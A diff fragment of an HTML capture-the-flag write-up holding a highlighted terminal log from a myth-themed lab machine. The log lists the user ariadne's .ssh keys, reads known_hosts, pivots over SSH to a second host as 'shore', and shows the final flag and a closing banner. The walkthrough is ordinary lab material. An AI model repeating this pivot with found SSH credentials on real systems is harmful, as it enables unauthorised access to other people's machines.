+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="n">ariadne</span><span class="w">  </span><span class="n">ariadne</span><span class="w">  </span><span class="mi">14</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mo">03</span><span class="o">:</span><span class="mi">26</span><span class="w"> </span><span class="n">ariadne</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="n">entrance</span><span class="w"> </span><span class="n">entrance</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mo">02</span><span class="o">:</span><span class="mi">40</span><span class="w"> </span><span class="n">entrance</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mo">03</span><span class="o">:</span><span class="mi">14</span><span class="w"> </span><span class="n">minotaur</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">ariadne</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ariadne$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+<span class="n">total</span><span class="w"> </span><span class="mi">102</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">    </span><span class="mi">14</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mo">03</span><span class="o">:</span><span class="mi">26</span><span class="w"> </span><span class="p">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">root</span><span class="w">    </span><span class="n">root</span><span class="w">        </span><span class="mi">5</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">..</span>
+<span class="n">lrwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">    </span><span class="n">root</span><span class="w">        </span><span class="mi">9</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">   </span><span class="mi">220</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">  </span><span class="mi">3771</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span>
+<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">     </span><span class="mi">3</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">gnupg</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">   </span><span class="mi">807</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span>
+<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">     </span><span class="mi">5</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">4</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">    </span><span class="mi">38</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">Minotaur_Flag</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">   </span><span class="mi">689</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">20</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">TheReturn</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="mi">29720</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">20</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">ariadne</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="mi">29720</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mo">03</span><span class="o">:</span><span class="mi">26</span><span class="w"> </span><span class="n">final</span><span class="p">.</span><span class="n">jpg</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="mi">29700</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mo">03</span><span class="o">:</span><span class="mi">26</span><span class="w"> </span><span class="n">jpeg_body</span><span class="p">.</span><span class="n">bin</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">    </span><span class="mi">20</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mo">03</span><span class="o">:</span><span class="mi">26</span><span class="w"> </span><span class="n">jpeg_header</span><span class="p">.</span><span class="n">bin</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ariadne$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ariadne</span><span class="o">/</span><span class="p">.</span><span class="n">ssh$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+<span class="n">total</span><span class="w"> </span><span class="mi">7</span>
+<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">    </span><span class="mi">5</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">4</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">   </span><span class="mi">14</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mo">03</span><span class="o">:</span><span class="mi">26</span><span class="w"> </span><span class="p">..</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="mi">1679</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">id_rsa</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">  </span><span class="mi">399</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">id_rsa</span><span class="p">.</span><span class="n">pub</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w"> </span><span class="n">ariadne</span><span class="w">  </span><span class="mi">444</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mo">03</span><span class="o">:</span><span class="mi">33</span><span class="w"> </span><span class="n">known_hosts</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ariadne</span><span class="o">/</span><span class="p">.</span><span class="n">ssh$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">known_hosts</span>
+<span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="n">R88uaNRrE9cqD0Ou2KdWXzayG6E</span><span class="o">=|</span><span class="n">PBesDIm0gzmr9n3WJrGtY0Rsofg</span><span class="o">=</span><span class="w"> </span><span class="n">ecdsa</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp256</span><span class="w"> </span><span class="n">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEE4dTpUgFM9GZvckN8</span><span class="o">/</span><span class="n">RQFwHQgYE1HL3TK7OlvV3BlmoPyrC4WB9Ib3BR45Os22jStHYr</span><span class="o">/</span><span class="n">tWPh</span><span class="o">/</span><span class="mi">4</span><span class="n">IWc3td7DRw</span><span class="o">=</span>
+<span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="n">opaMgWGBGwKAYZhnX4pM2JMA</span><span class="o">+</span><span class="n">Ck</span><span class="o">=|</span><span class="n">bMPoqMpe3qzGgWONOmrWs09HWNI</span><span class="o">=</span><span class="w"> </span><span class="n">ecdsa</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp256</span><span class="w"> </span><span class="n">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGy</span><span class="o">/</span><span class="n">yjIbzS3kTHnzuzS7lbDjQAOpQDYw7883aFvYqH1q32nBci9bPAoJ1TwXaqhSu</span><span class="o">+</span><span class="n">B7oRChOQzlbDs9hk4SNsw</span><span class="o">=</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ariadne</span><span class="o">/</span><span class="p">.</span><span class="n">ssh$</span><span class="w">  </span><span class="n">ssh</span><span class="w"> </span><span class="n">shore</span><span class="mf">@10.71.235.37</span>
+<span class="n">shore</span><span class="mf">@10.71.235.37</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="o">:</span><span class="w"> </span>
+<span class="cp">#############################################################################</span>
+<span class="cp">#(@@@@)                    (#########)                   (@@@@@@@@(@@@@@@@@@#</span>
+<span class="cp">#@@@@@@)___                 (####)~~~   /\                ~~(@@@@@@@(@@@@@@@#</span>
+<span class="cp">#@@@@@@@@@@)                 ~~~~      /::~-__               ~~~(@@@@@@@@)~~#</span>
+<span class="cp">#@@@)~~~~~~                           /::::::/\                  ~~(@@@@)   #</span>
+<span class="cp">#~~~                              O  /::::::/::~--,                 ~~~~    #</span>
+<span class="cp">#                                 | /:::::/::::::/{                         #</span>
+<span class="cp">#                 |\              |/::::/::::::/:::|                        #</span>
+<span class="cp">#                |:/~\           ||:::/:::::/::::::|                        #</span>
+<span class="cp">#               |,/:::\          ||/&#39;::: /::::::::::|                       #</span>
+<span class="cp">#              |#__--~~\        |&#39;#::,,/::::::::: __|   ,,&#39;`,               #</span>
+<span class="cp">#             |__# :::::\       |-#&quot;&quot;:::::::__--~~::| ,&#39;     &#39;,     ,,      #</span>
+<span class="cp">#,    ,,     |____#~~~--\,&#39;&#39;,.  |_#____---~~:::::::::|         &#39;,&#39;,&#39;  &#39;,    #</span>
+<span class="cp"># &#39;.,&#39;  &#39;.,,&#39;|::::##~~~--\    `,||#|::::::_____----~~~|         ,,,     &#39;.&#39;&#39;#</span>
+<span class="cp">#____________&#39;----###__:::\_____||#|--~~~~::::: ____--~______,,&#39;&#39;___________#</span>
+<span class="cp">#^^^  ^^^^^   |#######\~~~^^O, | ### __-----~~~~_____########&#39;  ^^^^  ^^^   #</span>
+<span class="cp">#,^^^^^&#39;,&#39;^^^^,|#########\_||\__O###~_######___###########;&#39; ^^^^  ^^^   ^^ #</span>
+<span class="cp">#^^/\/^^^^/\/\^^|#######################################;&#39;/\/\/^^^/\/^^^/\/^#</span>
+<span class="cp">#   /\/\/\/\/\  /\|####################################&#39;      /\/\/\/\/\    #</span>
+<span class="cp">#\/\/\     /\/\/\  /\/\/\/\    /\/\/\/\/\   /\/\/\    /\/\/\/\      /\/\/\/\#</span>
+<span class="cp">#spb\/\/\    /\/\/\/\    /\/\/\/\    /\/\/\/\   /\/\/\/\    /\/\/\/\/\      #</span>
+<span class="cp">#############################################################################</span>
+<span class="n">shore</span><span class="p">@</span><span class="n">Athens</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">Athens_flag</span><span class="w">  </span><span class="n">BlackSails</span>
+<span class="n">shore</span><span class="p">@</span><span class="n">Athens</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">Athens_flag</span>
+<span class="w"> </span><span class="n">____</span><span class="w"> </span><span class="n">____</span><span class="w"> </span><span class="n">____</span><span class="w"> </span><span class="n">____</span><span class="w"> </span><span class="n">____</span><span class="w"> </span><span class="n">____</span><span class="w"> </span><span class="n">____</span><span class="w"> </span>
+<span class="o">||</span><span class="n">T</span><span class="w"> </span><span class="o">|||</span><span class="n">h</span><span class="w"> </span><span class="o">|||</span><span class="n">e</span><span class="w"> </span><span class="o">|||</span><span class="n">s</span><span class="w"> </span><span class="o">|||</span><span class="n">e</span><span class="w"> </span><span class="o">|||</span><span class="n">u</span><span class="w"> </span><span class="o">|||</span><span class="n">s</span><span class="w"> </span><span class="o">||</span>
+<span class="o">||</span><span class="n">__</span><span class="o">|||</span><span class="n">__</span><span class="o">|||</span><span class="n">__</span><span class="o">|||</span><span class="n">__</span><span class="o">|||</span><span class="n">__</span><span class="o">|||</span><span class="n">__</span><span class="o">|||</span><span class="n">__</span><span class="o">||</span>
+<span class="o">|/</span><span class="n">__</span><span class="err">\</span><span class="o">|/</span><span class="n">__</span><span class="err">\</span><span class="o">|/</span><span class="n">__</span><span class="err">\</span><span class="o">|/</span><span class="n">__</span><span class="err">\</span><span class="o">|/</span><span class="n">__</span><span class="err">\</span><span class="o">|/</span><span class="n">__</span><span class="err">\</span><span class="o">|/</span><span class="n">__</span><span class="err">\</span><span class="o">|</span>
 
-You've survived your journey      O
-and made it safely back to     ,-.|____________________
-Crete, but your adventures   O==+-|(&gt;-------- --  -     .&gt;
-have only just begun, soon     `- |&quot;&quot;&quot;&quot;&quot;&quot;&quot;d88b&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
-there will be many more foes     | O     d8P 88b
-to face and many more heros      |  \    88= ,=88
-to recount.                      |   )   9b _. 88b
-                                 `._ `.   8`--'888
-                                  |    \--'\   `-8___
-                                  \`-.              \
-                                   `. \ -       _ / &lt;
-                                     \ `---   ___/|_-\
-Until next time brave hero.           |._      _. |_-|
-                                      \  _     _  /.-\
-                                       | -! . !- ||   |
-                                       \ &quot;| ! |&quot; /\   |
-                                        =oO)X(Oo=  \  /
-                                        888888888   &lt; \
-                                       d888888888b  \_/ 
-                                       88888888888
-</code></pre>
+<span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span><span class="w"> </span><span class="n">survived</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">journey</span><span class="w">      </span><span class="n">O</span>
+<span class="n">and</span><span class="w"> </span><span class="n">made</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">safely</span><span class="w"> </span><span class="n">back</span><span class="w"> </span><span class="n">to</span><span class="w">     </span><span class="p">,</span><span class="o">-</span><span class="p">.</span><span class="o">|</span><span class="n">____________________</span>
+<span class="n">Crete</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">adventures</span><span class="w">   </span><span class="n">O</span><span class="o">==+-|</span><span class="p">(</span><span class="o">&gt;--------</span><span class="w"> </span><span class="o">--</span><span class="w">  </span><span class="o">-</span><span class="w">     </span><span class="p">.</span><span class="o">&gt;</span>
+<span class="n">have</span><span class="w"> </span><span class="n">only</span><span class="w"> </span><span class="n">just</span><span class="w"> </span><span class="n">begun</span><span class="p">,</span><span class="w"> </span><span class="n">soon</span><span class="w">     </span><span class="err">`</span><span class="o">-</span><span class="w"> </span><span class="o">|</span><span class="s">&quot;&quot;&quot;&quot;&quot;&quot;&quot;d88b&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span>
+<span class="n">there</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">many</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">foes</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">O</span><span class="w">     </span><span class="n">d8P</span><span class="w"> </span><span class="mi">88</span><span class="n">b</span>
+<span class="n">to</span><span class="w"> </span><span class="n">face</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">many</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">heros</span><span class="w">      </span><span class="o">|</span><span class="w">  </span><span class="err">\</span><span class="w">    </span><span class="mi">88</span><span class="o">=</span><span class="w"> </span><span class="p">,</span><span class="o">=</span><span class="mi">88</span>
+<span class="n">to</span><span class="w"> </span><span class="n">recount</span><span class="p">.</span><span class="w">                      </span><span class="o">|</span><span class="w">   </span><span class="p">)</span><span class="w">   </span><span class="mi">9</span><span class="n">b</span><span class="w"> </span><span class="n">_</span><span class="p">.</span><span class="w"> </span><span class="mi">88</span><span class="n">b</span>
+<span class="w">                                 </span><span class="err">`</span><span class="p">.</span><span class="n">_</span><span class="w"> </span><span class="err">`</span><span class="p">.</span><span class="w">   </span><span class="mi">8</span><span class="err">`</span><span class="o">--</span><span class="err">&#39;</span><span class="mi">888</span>
+<span class="w">                                  </span><span class="o">|</span><span class="w">    </span><span class="err">\</span><span class="o">--</span><span class="err">&#39;\</span><span class="w">   </span><span class="err">`</span><span class="mi">-8</span><span class="n">___</span>
+<span class="w">                                  </span><span class="err">\`</span><span class="o">-</span><span class="p">.</span><span class="w">              </span>\
+<span class="w">                                   </span><span class="err">`</span><span class="p">.</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="o">-</span><span class="w">       </span><span class="n">_</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&lt;</span>
+<span class="w">                                     </span><span class="err">\</span><span class="w"> </span><span class="err">`</span><span class="o">---</span><span class="w">   </span><span class="n">___</span><span class="o">/|</span><span class="n">_</span><span class="o">-</span>\
+<span class="n">Until</span><span class="w"> </span><span class="n">next</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="n">brave</span><span class="w"> </span><span class="n">hero</span><span class="p">.</span><span class="w">           </span><span class="o">|</span><span class="p">.</span><span class="n">_</span><span class="w">      </span><span class="n">_</span><span class="p">.</span><span class="w"> </span><span class="o">|</span><span class="n">_</span><span class="o">-|</span>
+<span class="w">                                      </span><span class="err">\</span><span class="w">  </span><span class="n">_</span><span class="w">     </span><span class="n">_</span><span class="w">  </span><span class="o">/</span><span class="p">.</span><span class="o">-</span>\
+<span class="w">                                       </span><span class="o">|</span><span class="w"> </span><span class="o">-!</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="o">!-</span><span class="w"> </span><span class="o">||</span><span class="w">   </span><span class="o">|</span>
+<span class="w">                                       </span><span class="err">\</span><span class="w"> </span><span class="s">&quot;| ! |&quot;</span><span class="w"> </span><span class="o">/</span><span class="err">\</span><span class="w">   </span><span class="o">|</span>
+<span class="w">                                        </span><span class="o">=</span><span class="n">oO</span><span class="p">)</span><span class="n">X</span><span class="p">(</span><span class="n">Oo</span><span class="o">=</span><span class="w">  </span><span class="err">\</span><span class="w">  </span><span class="o">/</span>
+<span class="w">                                        </span><span class="mi">888888888</span><span class="w">   </span><span class="o">&lt;</span><span class="w"> </span>\
+<span class="w">                                       </span><span class="n">d888888888b</span><span class="w">  </span><span class="err">\</span><span class="n">_</span><span class="o">/</span><span class="w"> </span>
+<span class="w">                                       </span><span class="mi">88888888888</span>
+</code></pre></div>
         </div>
     </main>
 
